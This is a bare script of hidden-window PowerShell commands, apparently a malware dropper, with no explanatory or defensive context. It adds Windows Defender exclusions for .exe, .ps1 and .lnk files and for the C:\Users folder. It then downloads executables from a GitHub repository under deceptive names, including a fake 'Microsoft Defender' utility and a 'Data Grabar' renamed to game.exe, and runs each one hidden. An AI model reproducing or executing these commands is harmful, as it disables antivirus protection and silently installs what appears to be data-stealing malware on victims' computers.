powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\Browser.exe
powershell.exe -w Hidden C:\Users\Browser.exe
powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/test/raw/main/Data%20Grabar.exe -o C:\Users\game.exe
powershell.exe -w Hidden C:\Users\game.exe
